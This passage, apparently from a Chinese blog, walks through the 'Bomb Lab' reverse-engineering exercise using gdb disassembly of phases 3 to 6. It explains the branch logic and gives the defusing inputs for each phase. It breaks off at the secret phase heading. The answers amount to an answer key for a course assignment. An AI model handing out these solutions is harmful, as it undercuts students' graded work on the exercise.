[rbp-0xc],0x230</span><br><span class="line">0x000055555555571a &lt;+201&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">0x000055555555571c &lt;+203&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">0x0000555555555721 &lt;+208&gt;:	mov    eax,0x69</span><br><span class="line">0x0000555555555726 &lt;+213&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line"></span><br><span class="line">0x0000555555555728 &lt;+215&gt;:	mov    eax,0x72</span><br><span class="line">0x000055555555572d &lt;+220&gt;:	cmp    DWORD PTR [rbp-0xc],0x398</span><br><span class="line">0x0000555555555734 &lt;+227&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">0x0000555555555736 &lt;+229&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">0x000055555555573b &lt;+234&gt;:	mov    eax,0x72</span><br><span class="line">0x0000555555555740 &lt;+239&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line"></span><br><span class="line">0x0000555555555742 &lt;+241&gt;:	mov    eax,0x71</span><br><span class="line">0x0000555555555747 &lt;+246&gt;:	cmp    DWORD PTR [rbp-0xc],0xe2</span><br><span class="line">0x000055555555574e &lt;+253&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">0x0000555555555750 &lt;+255&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">0x0000555555555755 &lt;+260&gt;:	mov    eax,0x71</span><br><span class="line">0x000055555555575a &lt;+265&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line"></span><br><span class="line">0x000055555555575c &lt;+267&gt;:	mov    eax,0x6f</span><br><span class="line">0x0000555555555761 &lt;+272&gt;:	cmp    DWORD PTR [rbp-0xc],0x207</span><br><span class="line">0x0000555555555768 &lt;+279&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">0x000055555555576a &lt;+281&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">0x000055555555576f &lt;+286&gt;:	mov    eax,0x6f</span><br><span class="line">0x0000555555555774 &lt;+291&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line"></span><br><span class="line">0x0000555555555776 &lt;+293&gt;:	mov    eax,0x77</span><br><span class="line">0x000055555555577b &lt;+298&gt;:	cmp    DWORD PTR [rbp-0xc],0xe1</span><br><span class="line">0x0000555555555782 &lt;+305&gt;:	je     0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line">0x0000555555555784 &lt;+307&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">0x0000555555555789 &lt;+312&gt;:	mov    eax,0x77</span><br><span class="line">0x000055555555578e &lt;+317&gt;:	jmp    0x55555555579a &lt;phase_3+329&gt;</span><br><span class="line"></span><br><span class="line">0x0000555555555790 &lt;+319&gt;:	call   0x555555555e02 &lt;explode_bomb&gt;</span><br><span class="line">0x000055555555579a &lt;+329&gt;:	cmp    BYTE PTR [rbp-0x11],al</span><br></pre></td></tr></table></figure>
<p>这里共有8种分支，分别对应着<code>0</code> ~ <code>7</code>，让我们分别输入<code>0</code> ~ <code>7</code>进行调试</p>
<p>设置好断点后，依次输入<code>0</code> <code>1</code> <code>2</code> <code>3</code> <code>4</code> <code>5</code> <code>6</code> <code>7</code>作为第一个数字进行测试</p>
<p>显示反汇编窗口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) layout asm</span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/bomblab/10.png" alt="img"></p>
<p>通过<code>next</code>命令不断按顺序执行每一行的操作，发现最终跳转到了……</p>
<p><img src="/img/jj/bomblab/11.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x5555555556ae &lt;phase_3+93&gt;     mov    eax,0x6a</span><br><span class="line">0x5555555556b3 &lt;phase_3+98&gt;     cmp    DWORD PTR [rbp-0xc],0x104</span><br></pre></td></tr></table></figure>
<p>显然，<code>eax</code>对应<code>0x6a</code>，<code>[rbp-0xc]</code>对应<code>0x104</code></p>
<p>而<code>0x6a</code>转换成十进制<code>106</code>，其作为ASCII码对应的字符为<code>j</code></p>
<p><code>0x104</code>对应的数字则为<code>260</code></p>
<p>同理可得其他<code>1</code> ~ <code>7</code>的情况对应的分支</p>
<p>最后<code>Ctrl</code>+<code>X</code>+<code>A</code>退出反编译窗口</p>
<p>故答案有这8种情况：</p>
<blockquote>
<p><code>0 j 260</code></p>
<p><code>1 y 89</code></p>
<p><code>2 z 154</code></p>
<p><code>3 i 560</code></p>
<p><code>4 r 920</code></p>
<p><code>5 q 226</code></p>
<p><code>6 o 519</code></p>
<p><code>7 w 225</code></p>
</blockquote>
</li>
</ul>
<h3 id="·-phase-4"><a href="#·-phase-4" class="headerlink" title="· phase_4"></a><code>· phase_4</code></h3><p>反汇编<code>phase_4</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">   0x00000000000017fa &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x00000000000017fe &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x00000000000017ff &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000001802 &lt;+8&gt;:	sub    rsp,0x10</span><br><span class="line">   0x0000000000001806 &lt;+12&gt;:	mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x000000000000180f &lt;+21&gt;:	mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x0000000000001813 &lt;+25&gt;:	xor    eax,eax</span><br><span class="line">   0x0000000000001815 &lt;+27&gt;:	lea    rcx,[rbp-0xc]</span><br><span class="line">   0x0000000000001819 &lt;+31&gt;:	lea    rdx,[rbp-0x10]</span><br><span class="line">   0x000000000000181d &lt;+35&gt;:	lea    rsi,[rip+0x1b81]        # 0x33a5</span><br><span class="line">   0x0000000000001824 &lt;+42&gt;:	call   0x12c0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000001829 &lt;+47&gt;:	cmp    eax,0x2</span><br><span class="line">   0x000000000000182c &lt;+50&gt;:	jne    0x1834 &lt;phase_4+58&gt;</span><br><span class="line">   0x000000000000182e &lt;+52&gt;:	cmp    DWORD PTR [rbp-0x10],0xe</span><br><span class="line">   0x0000000000001832 &lt;+56&gt;:	jbe    0x1839 &lt;phase_4+63&gt;</span><br><span class="line">   0x0000000000001834 &lt;+58&gt;:	call   0x1e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000001839 &lt;+63&gt;:	mov    edx,0xe</span><br><span class="line">   0x000000000000183e &lt;+68&gt;:	mov    esi,0x0</span><br><span class="line">   0x0000000000001843 &lt;+73&gt;:	mov    edi,DWORD PTR [rbp-0x10]</span><br><span class="line">   0x0000000000001846 &lt;+76&gt;:	call   0x17bc &lt;func4&gt;</span><br><span class="line">   0x000000000000184b &lt;+81&gt;:	cmp    eax,0x6</span><br><span class="line">   0x000000000000184e &lt;+84&gt;:	jne    0x1856 &lt;phase_4+92&gt;</span><br><span class="line">   0x0000000000001850 &lt;+86&gt;:	cmp    DWORD PTR [rbp-0xc],0x6</span><br><span class="line">   0x0000000000001854 &lt;+90&gt;:	je     0x185b &lt;phase_4+97&gt;</span><br><span class="line">   0x0000000000001856 &lt;+92&gt;:	call   0x1e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000000185b &lt;+97&gt;:	mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x000000000000185f &lt;+101&gt;:	xor    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x0000000000001868 &lt;+110&gt;:	jne    0x186c &lt;phase_4+114&gt;</span><br><span class="line">   0x000000000000186a &lt;+112&gt;:	leave  </span><br><span class="line">   0x000000000000186b &lt;+113&gt;:	ret    </span><br><span class="line">   0x000000000000186c &lt;+114&gt;:	call   0x1220 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>反汇编<code>func4</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x00000000000017bc &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x00000000000017c0 &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x00000000000017c1 &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x00000000000017c4 &lt;+8&gt;:	mov    eax,edx</span><br><span class="line">   0x00000000000017c6 &lt;+10&gt;:	sub    eax,esi</span><br><span class="line">   0x00000000000017c8 &lt;+12&gt;:	mov    ecx,eax</span><br><span class="line">   0x00000000000017ca &lt;+14&gt;:	shr    ecx,0x1f</span><br><span class="line">   0x00000000000017cd &lt;+17&gt;:	add    ecx,eax</span><br><span class="line">   0x00000000000017cf &lt;+19&gt;:	sar    ecx,1</span><br><span class="line">   0x00000000000017d1 &lt;+21&gt;:	add    ecx,esi</span><br><span class="line">   0x00000000000017d3 &lt;+23&gt;:	cmp    ecx,edi</span><br><span class="line">   0x00000000000017d5 &lt;+25&gt;:	jg     0x17e0 &lt;func4+36&gt;</span><br><span class="line">   0x00000000000017d7 &lt;+27&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000000017dc &lt;+32&gt;:	jl     0x17ec &lt;func4+48&gt;</span><br><span class="line">   0x00000000000017de &lt;+34&gt;:	pop    rbp</span><br><span class="line">   0x00000000000017df &lt;+35&gt;:	ret    </span><br><span class="line">   0x00000000000017e0 &lt;+36&gt;:	lea    edx,[rcx-0x1]</span><br><span class="line">   0x00000000000017e3 &lt;+39&gt;:	call   0x17bc &lt;func4&gt;</span><br><span class="line">   0x00000000000017e8 &lt;+44&gt;:	add    eax,eax</span><br><span class="line">   0x00000000000017ea &lt;+46&gt;:	jmp    0x17de &lt;func4+34&gt;</span><br><span class="line">   0x00000000000017ec &lt;+48&gt;:	lea    esi,[rcx+0x1]</span><br><span class="line">   0x00000000000017ef &lt;+51&gt;:	call   0x17bc &lt;func4&gt;</span><br><span class="line">   0x00000000000017f4 &lt;+56&gt;:	lea    eax,[rax+rax*1+0x1]</span><br><span class="line">   0x00000000000017f8 &lt;+60&gt;:	jmp    0x17de &lt;func4+34&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>查看内存地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000001815 &lt;+27&gt;:	lea    rcx,[rbp-0xc]</span><br><span class="line">0x0000000000001819 &lt;+31&gt;:	lea    rdx,[rbp-0x10]</span><br><span class="line">0x000000000000181d &lt;+35&gt;:	lea    rsi,[rip+0x1b81]        # 0x33a5</span><br><span class="line">0x0000000000001824 &lt;+42&gt;:	call   0x12c0 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x33a5</span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/bomblab/12.png" alt="img"></p>
<p>需要输入两个数字，分别存到<code>[rbp-0x10]</code>和<code>[rbp-0xc]</code>里</p>
<p>阅读<code>phase_4</code>程序我们发现</p>
<p>第一个数字必须小于等于<code>14</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000000182e &lt;+52&gt;:	cmp    DWORD PTR [rbp-0x10],0xe</span><br><span class="line">0x0000000000001832 &lt;+56&gt;:	jbe    0x1839 &lt;phase_4+63&gt;</span><br><span class="line">0x0000000000001834 &lt;+58&gt;:	call   0x1e02 &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p><code>func4</code>函数返回值必须为<code>6</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x0000000000001846 &lt;+76&gt;:	call   0x17bc &lt;func4&gt;</span><br><span class="line">0x000000000000184b &lt;+81&gt;:	cmp    eax,0x6</span><br><span class="line">0x000000000000184e &lt;+84&gt;:	jne    0x1856 &lt;phase_4+92&gt;</span><br><span class="line">0x0000000000001856 &lt;+92&gt;:	call   0x1e02 &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>第二个数字必须为<code>6</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000001850 &lt;+86&gt;:	cmp    DWORD PTR [rbp-0xc],0x6</span><br><span class="line">0x0000000000001854 &lt;+90&gt;:	je     0x185b &lt;phase_4+97&gt;</span><br><span class="line">0x0000000000001856 &lt;+92&gt;:	call   0x1e02 &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>通过解析<code>func4</code>函数以及需要传入的参数，我们可以推理出，第一个数字也必须为<code>6</code></p>
<p>故答案为：</p>
<blockquote>
<p><code>6 6</code></p>
</blockquote>
<h3 id="·-phase-5"><a href="#·-phase-5" class="headerlink" title="· phase_5"></a><code>· phase_5</code></h3><p>反汇编<code>phase_5</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">   0x0000000000001871 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x0000000000001875 &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x0000000000001876 &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000001879 &lt;+8&gt;:	push   rbx</span><br><span class="line">   0x000000000000187a &lt;+9&gt;:	sub    rsp,0x18</span><br><span class="line">   0x000000000000187e &lt;+13&gt;:	mov    rbx,rdi</span><br><span class="line">   0x0000000000001881 &lt;+16&gt;:	mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x000000000000188a &lt;+25&gt;:	mov    QWORD PTR [rbp-0x18],rax</span><br><span class="line">   0x000000000000188e &lt;+29&gt;:	xor    eax,eax</span><br><span class="line">   0x0000000000001890 &lt;+31&gt;:	call   0x1b65 &lt;string_length&gt;</span><br><span class="line">   0x0000000000001895 &lt;+36&gt;:	cmp    eax,0x6</span><br><span class="line">   0x0000000000001898 &lt;+39&gt;:	jne    0x18ed &lt;phase_5+124&gt;</span><br><span class="line">   0x000000000000189a &lt;+41&gt;:	mov    eax,0x0</span><br><span class="line">   0x000000000000189f &lt;+46&gt;:	lea    rcx,[rip+0x193a]        # 0x31e0 &lt;array.3473&gt;</span><br><span class="line">   0x00000000000018a6 &lt;+53&gt;:	movzx  edx,BYTE PTR [rbx+rax*1]</span><br><span class="line">   0x00000000000018aa &lt;+57&gt;:	and    edx,0xf</span><br><span class="line">   0x00000000000018ad &lt;+60&gt;:	movzx  edx,BYTE PTR [rcx+rdx*1]</span><br><span class="line">   0x00000000000018b1 &lt;+64&gt;:	mov    BYTE PTR [rbp+rax*1-0x1f],dl</span><br><span class="line">   0x00000000000018b5 &lt;+68&gt;:	add    rax,0x1</span><br><span class="line">   0x00000000000018b9 &lt;+72&gt;:	cmp    rax,0x6</span><br><span class="line">   0x00000000000018bd &lt;+76&gt;:	jne    0x18a6 &lt;phase_5+53&gt;</span><br><span class="line">   0x00000000000018bf &lt;+78&gt;:	mov    BYTE PTR [rbp-0x19],0x0</span><br><span class="line">   0x00000000000018c3 &lt;+82&gt;:	lea    rdi,[rbp-0x1f]</span><br><span class="line">   0x00000000000018c7 &lt;+86&gt;:	lea    rsi,[rip+0x18e1]        # 0x31af</span><br><span class="line">   0x00000000000018ce &lt;+93&gt;:	call   0x1b86 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000000018d3 &lt;+98&gt;:	test   eax,eax</span><br><span class="line">   0x00000000000018d5 &lt;+100&gt;:	jne    0x18f4 &lt;phase_5+131&gt;</span><br><span class="line">   0x00000000000018d7 &lt;+102&gt;:	mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line">   0x00000000000018db &lt;+106&gt;:	xor    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x00000000000018e4 &lt;+115&gt;:	jne    0x18fb &lt;phase_5+138&gt;</span><br><span class="line">   0x00000000000018e6 &lt;+117&gt;:	add    rsp,0x18</span><br><span class="line">   0x00000000000018ea &lt;+121&gt;:	pop    rbx</span><br><span class="line">   0x00000000000018eb &lt;+122&gt;:	pop    rbp</span><br><span class="line">   0x00000000000018ec &lt;+123&gt;:	ret    </span><br><span class="line">   0x00000000000018ed &lt;+124&gt;:	call   0x1e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000000018f2 &lt;+129&gt;:	jmp    0x189a &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000000018f4 &lt;+131&gt;:	call   0x1e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000000018f9 &lt;+136&gt;:	jmp    0x18d7 &lt;phase_5+102&gt;</span><br><span class="line">   0x00000000000018fb &lt;+138&gt;:	call   0x1220 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>老规矩，查看内存地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00000000000018c7 &lt;+86&gt;:	lea    rsi,[rip+0x18e1]        # 0x31af</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x31af</span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/bomblab/13.png" alt="img"></p>
<p>但是我们发现，这关与第一关不一样，并不是直接复制粘贴就行</p>
<p>当我们查看另一个内存地址时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000000189f &lt;+46&gt;:	lea    rcx,[rip+0x193a]        # 0x31e0 &lt;array.3473&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/s 0x31e0</span><br><span class="line">0x31e0 &lt;array.3473&gt;:	&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>So you think you can stop the bomb with ctrl-c, do you?</p>
<p>所以你认为你可以用ctrl-c来阻止炸弹，是吗？</p>
</blockquote>
<p>显然不行</p>
<p>分析程序知，是通过取我们输入六个字符的<code>ASCII</code>码的低四位作为索引值，查找<code>maduiersnfotvbyl</code>里的字符组成</p>
<p><code>maduiersnfotvbyl</code>中<code>f</code>为第<code>9</code>位，<code>l</code>为第<code>15</code>位，<code>y</code>第<code>14</code>位，<code>e</code>第<code>5</code>位，<code>r</code>第<code>6</code>位，<code>s</code>第<code>7</code>位</p>
<p>也就是说，我们需要输入6个字符，使它们<code>ASCII</code>码低四位分别是：<code>1001</code>, <code>1111</code>, <code>1110</code>, <code>0101</code>, <code>0110</code>, <code>0111</code></p>
<p>所以同样有多种答案（每一位的所有可能的答案如下所示）：</p>
<blockquote>
<ol>
<li><code>I Y i y</code>…</li>
<li><code>O o</code>…</li>
<li><code>N n</code>…</li>
<li><code>E U e u</code>…</li>
<li><code>F V f v</code>…</li>
<li><code>G W g w</code>…</li>
</ol>
</blockquote>
<h3 id="·-phase-6"><a href="#·-phase-6" class="headerlink" title="· phase_6"></a>· phase_6</h3><p>反汇编<code>phase_6</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">   0x0000000000001900 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x0000000000001904 &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x0000000000001905 &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000001908 &lt;+8&gt;:	push   r15</span><br><span class="line">   0x000000000000190a &lt;+10&gt;:	push   r14</span><br><span class="line">   0x000000000000190c &lt;+12&gt;:	push   r13</span><br><span class="line">   0x000000000000190e &lt;+14&gt;:	push   r12</span><br><span class="line">   0x0000000000001910 &lt;+16&gt;:	push   rbx</span><br><span class="line">   0x0000000000001911 &lt;+17&gt;:	sub    rsp,0x68</span><br><span class="line">   0x0000000000001915 &lt;+21&gt;:	mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x000000000000191e &lt;+30&gt;:	mov    QWORD PTR [rbp-0x38],rax</span><br><span class="line">   0x0000000000001922 &lt;+34&gt;:	xor    eax,eax</span><br><span class="line">   0x0000000000001924 &lt;+36&gt;:	lea    r14,[rbp-0x90]</span><br><span class="line">   0x000000000000192b &lt;+43&gt;:	mov    rsi,r14</span><br><span class="line">   0x000000000000192e &lt;+46&gt;:	call   0x1e42 &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000001933 &lt;+51&gt;:	mov    r15d,0x1</span><br><span class="line">   0x0000000000001939 &lt;+57&gt;:	mov    r13,r14</span><br><span class="line">   0x000000000000193c &lt;+60&gt;:	jmp    0x1968 &lt;phase_6+104&gt;</span><br><span class="line">   0x000000000000193e &lt;+62&gt;:	call   0x1e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000001943 &lt;+67&gt;:	jmp    0x1976 &lt;phase_6+118&gt;</span><br><span class="line">   0x0000000000001945 &lt;+69&gt;:	add    rbx,0x1</span><br><span class="line">   0x0000000000001949 &lt;+73&gt;:	cmp    ebx,0x5</span><br><span class="line">   0x000000000000194c &lt;+76&gt;:	jg     0x1960 &lt;phase_6+96&gt;</span><br><span class="line">   0x000000000000194e &lt;+78&gt;:	mov    eax,DWORD PTR [r13+rbx*4+0x0]</span><br><span class="line">   0x0000000000001953 &lt;+83&gt;:	cmp    DWORD PTR [r12],eax</span><br><span class="line">   0x0000000000001957 &lt;+87&gt;:	jne    0x1945 &lt;phase_6+69&gt;</span><br><span class="line">   0x0000000000001959 &lt;+89&gt;:	call   0x1e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000000195e &lt;+94&gt;:	jmp    0x1945 &lt;phase_6+69&gt;</span><br><span class="line">   0x0000000000001960 &lt;+96&gt;:	add    r15,0x1</span><br><span class="line">   0x0000000000001964 &lt;+100&gt;:	add    r14,0x4</span><br><span class="line">   0x0000000000001968 &lt;+104&gt;:	mov    r12,r14</span><br><span class="line">   0x000000000000196b &lt;+107&gt;:	mov    eax,DWORD PTR [r14]</span><br><span class="line">   0x000000000000196e &lt;+110&gt;:	sub    eax,0x1</span><br><span class="line">   0x0000000000001971 &lt;+113&gt;:	cmp    eax,0x5</span><br><span class="line">   0x0000000000001974 &lt;+116&gt;:	ja     0x193e &lt;phase_6+62&gt;</span><br><span class="line">   0x0000000000001976 &lt;+118&gt;:	cmp    r15d,0x5</span><br><span class="line">   0x000000000000197a &lt;+122&gt;:	jg     0x1981 &lt;phase_6+129&gt;</span><br><span class="line">   0x000000000000197c &lt;+124&gt;:	mov    rbx,r15</span><br><span class="line">   0x000000000000197f &lt;+127&gt;:	jmp    0x194e &lt;phase_6+78&gt;</span><br><span class="line">   0x0000000000001981 &lt;+129&gt;:	mov    esi,0x0</span><br><span class="line">   0x0000000000001986 &lt;+134&gt;:	mov    ecx,DWORD PTR [rbp+rsi*4-0x90]</span><br><span class="line">   0x000000000000198d &lt;+141&gt;:	mov    eax,0x1</span><br><span class="line">   0x0000000000001992 &lt;+146&gt;:	lea    rdx,[rip+0x3c97]        # 0x5630 &lt;node1&gt;</span><br><span class="line">   0x0000000000001999 &lt;+153&gt;:	cmp    ecx,0x1</span><br><span class="line">   0x000000000000199c &lt;+156&gt;:	jle    0x19a9 &lt;phase_6+169&gt;</span><br><span class="line">   0x000000000000199e &lt;+158&gt;:	mov    rdx,QWORD PTR [rdx+0x8]</span><br><span class="line">   0x00000000000019a2 &lt;+162&gt;:	add    eax,0x1</span><br><span class="line">   0x00000000000019a5 &lt;+165&gt;:	cmp    eax,ecx</span><br><span class="line">   0x00000000000019a7 &lt;+167&gt;:	jne    0x199e &lt;phase_6+158&gt;</span><br><span class="line">   0x00000000000019a9 &lt;+169&gt;:	mov    QWORD PTR [rbp+rsi*8-0x70],rdx</span><br><span class="line">   0x00000000000019ae &lt;+174&gt;:	add    rsi,0x1</span><br><span class="line">   0x00000000000019b2 &lt;+178&gt;:	cmp    rsi,0x6</span><br><span class="line">   0x00000000000019b6 &lt;+182&gt;:	jne    0x1986 &lt;phase_6+134&gt;</span><br><span class="line">   0x00000000000019b8 &lt;+184&gt;:	mov    rbx,QWORD PTR [rbp-0x70]</span><br><span class="line">   0x00000000000019bc &lt;+188&gt;:	mov    rax,QWORD PTR [rbp-0x68]</span><br><span class="line">   0x00000000000019c0 &lt;+192&gt;:	mov    QWORD PTR [rbx+0x8],rax</span><br><span class="line">   0x00000000000019c4 &lt;+196&gt;:	mov    rdx,QWORD PTR [rbp-0x60]</span><br><span class="line">   0x00000000000019c8 &lt;+200&gt;:	mov    QWORD PTR [rax+0x8],rdx</span><br><span class="line">   0x00000000000019cc &lt;+204&gt;:	mov    rax,QWORD PTR [rbp-0x58]</span><br><span class="line">   0x00000000000019d0 &lt;+208&gt;:	mov    QWORD PTR [rdx+0x8],rax</span><br><span class="line">   0x00000000000019d4 &lt;+212&gt;:	mov    rdx,QWORD PTR [rbp-0x50]</span><br><span class="line">   0x00000000000019d8 &lt;+216&gt;:	mov    QWORD PTR [rax+0x8],rdx</span><br><span class="line">   0x00000000000019dc &lt;+220&gt;:	mov    rax,QWORD PTR [rbp-0x48]</span><br><span class="line">   0x00000000000019e0 &lt;+224&gt;:	mov    QWORD PTR [rdx+0x8],rax</span><br><span class="line">   0x00000000000019e4 &lt;+228&gt;:	mov    QWORD PTR [rax+0x8],0x0</span><br><span class="line">   0x00000000000019ec &lt;+236&gt;:	mov    r12d,0x5</span><br><span class="line">   0x00000000000019f2 &lt;+242&gt;:	jmp    0x19fe &lt;phase_6+254&gt;</span><br><span class="line">   0x00000000000019f4 &lt;+244&gt;:	mov    rbx,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00000000000019f8 &lt;+248&gt;:	sub    r12d,0x1</span><br><span class="line">   0x00000000000019fc &lt;+252&gt;:	je     0x1a0f &lt;phase_6+271&gt;</span><br><span class="line">   0x00000000000019fe &lt;+254&gt;:	mov    rax,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x0000000000001a02 &lt;+258&gt;:	mov    eax,DWORD PTR [rax]</span><br><span class="line">   0x0000000000001a04 &lt;+260&gt;:	cmp    DWORD PTR [rbx],eax</span><br><span class="line">   0x0000000000001a06 &lt;+262&gt;:	jge    0x19f4 &lt;phase_6+244&gt;</span><br><span class="line">   0x0000000000001a08 &lt;+264&gt;:	call   0x1e02 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000001a0d &lt;+269&gt;:	jmp    0x19f4 &lt;phase_6+244&gt;</span><br><span class="line">   0x0000000000001a0f &lt;+271&gt;:	mov    rax,QWORD PTR [rbp-0x38]</span><br><span class="line">   0x0000000000001a13 &lt;+275&gt;:	xor    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x0000000000001a1c &lt;+284&gt;:	jne    0x1a2d &lt;phase_6+301&gt;</span><br><span class="line">   0x0000000000001a1e &lt;+286&gt;:	add    rsp,0x68</span><br><span class="line">   0x0000000000001a22 &lt;+290&gt;:	pop    rbx</span><br><span class="line">   0x0000000000001a23 &lt;+291&gt;:	pop    r12</span><br><span class="line">   0x0000000000001a25 &lt;+293&gt;:	pop    r13</span><br><span class="line">   0x0000000000001a27 &lt;+295&gt;:	pop    r14</span><br><span class="line">   0x0000000000001a29 &lt;+297&gt;:	pop    r15</span><br><span class="line">   0x0000000000001a2b &lt;+299&gt;:	pop    rbp</span><br><span class="line">   0x0000000000001a2c &lt;+300&gt;:	ret    </span><br><span class="line">   0x0000000000001a2d &lt;+301&gt;:	call   0x1220 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>题目要求输入6个数字：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000000192e &lt;+46&gt;:	call   0x1e42 &lt;read_six_numbers&gt;</span><br></pre></td></tr></table></figure>
<p>输入的数小于等于6且两两不能相等：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000001945 &lt;+69&gt;:	add    rbx,0x1</span><br><span class="line">0x0000000000001949 &lt;+73&gt;:	cmp    ebx,0x5</span><br><span class="line">0x000000000000194c &lt;+76&gt;:	jg     0x1960 &lt;phase_6+96&gt;</span><br><span class="line">0x000000000000194e &lt;+78&gt;:	mov    eax,DWORD PTR [r13+rbx*4+0x0]</span><br><span class="line">0x0000000000001953 &lt;+83&gt;:	cmp    DWORD PTR [r12],eax</span><br><span class="line">0x0000000000001957 &lt;+87&gt;:	jne    0x1945 &lt;phase_6+69&gt;</span><br><span class="line">0x0000000000001959 &lt;+89&gt;:	call   0x1e02 &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>同时通过地址我们发现了链表，其含6个节点：</p>
<p><img src="/img/jj/bomblab/14.png" alt="img"></p>
<p>分析程序的最后部分发现，根据链表顺序最终的数字应是从大到小排列</p>
<blockquote>
<p><code>2 5 4 1 6 3</code></p>
</blockquote>
<h3 id="·-secret-phase"><a href="#·-secret-phase" class="headerlink" title="· secret_phase"></a><code>· secret_phase</code></h3><p>反汇编<code>phase_defused</code>函数</p>
